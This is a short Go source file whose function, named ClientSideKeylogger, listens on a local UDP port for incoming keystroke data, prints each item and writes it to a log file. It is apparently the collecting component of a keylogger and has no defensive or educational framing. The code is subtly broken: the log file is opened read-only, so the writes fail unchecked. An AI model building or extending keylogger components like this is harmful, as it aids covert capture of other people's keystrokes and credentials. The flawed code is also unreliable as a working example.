package client

import (
	"fmt"
	"net"
	"os"
)

const maxBuffer = 1024

func ClientSideKeylogger() {

	file, err := os.Open("logs.txt")
	if err != nil {
		panic(err)
	}

	defer func() {
		if err := file.Close(); err != nil {
			panic(err)
		}
	}()

	fmt.Println("Starting client...")
	saddr, err := net.ResolveUDPAddr("udp", "localhost:6940")
	if err != nil {
		fmt.Println(err)

	}
	sconn, err := net.ListenUDP("udp", saddr)
	if err != nil {
		fmt.Println(err)

	}

	defer sconn.Close()

	buffer := make([]byte, maxBuffer)

	for {
		data, _, err := sconn.ReadFromUDP(buffer)
		if err != nil {
			fmt.Println(err)
			return
		}
		if data > 0 {
			keys := string(buffer[:data])
			fmt.Printf("Key: %s\n", keys)
			file.Write(buffer[:data])
		}
	}
}
